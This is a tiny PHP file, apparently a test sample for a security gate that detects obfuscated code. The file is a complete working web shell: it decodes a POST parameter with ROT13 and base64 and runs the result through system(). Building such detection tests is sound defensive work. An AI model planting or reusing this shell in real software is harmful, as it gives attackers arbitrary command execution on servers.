<?php
// nested deobfuscation transforms must survive the gate
$c = $_POST['c'];
$cmd = base64_decode(str_rot13($c));
system($cmd);
